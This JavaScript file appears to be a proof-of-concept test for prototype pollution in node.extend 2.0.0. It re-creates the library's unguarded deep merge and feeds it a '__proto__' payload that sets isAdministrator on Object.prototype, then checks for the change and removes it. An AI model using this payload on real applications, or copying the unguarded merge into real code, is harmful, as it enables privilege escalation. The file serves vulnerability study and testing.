function isHash(value) {
  return Object.prototype.toString.call(value) === "[object Object]";
}

function representative200NodeExtend(deep, target, ...sources) {
  for (const source of sources) {
    for (const name in source) {
      const existing = target[name];
      const copy = source[name];
      if (target === copy) continue;
      if (deep && copy && (isHash(copy) || Array.isArray(copy))) {
        const clone = Array.isArray(copy)
          ? Array.isArray(existing)
            ? existing
            : []
          : existing && isHash(existing)
            ? existing
            : {};
        target[name] = representative200NodeExtend(true, clone, copy);
      } else if (copy !== undefined) {
        target[name] = copy;
      }
    }
  }
  return target;
}

const patch = JSON.parse('{"__proto__":{"isAdministrator":true}}');
try {
  representative200NodeExtend(true, {}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("node.extend 2.0.0 semantics did not modify Object.prototype");
  }
  console.log("node.extend 2.0.0 semantics modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
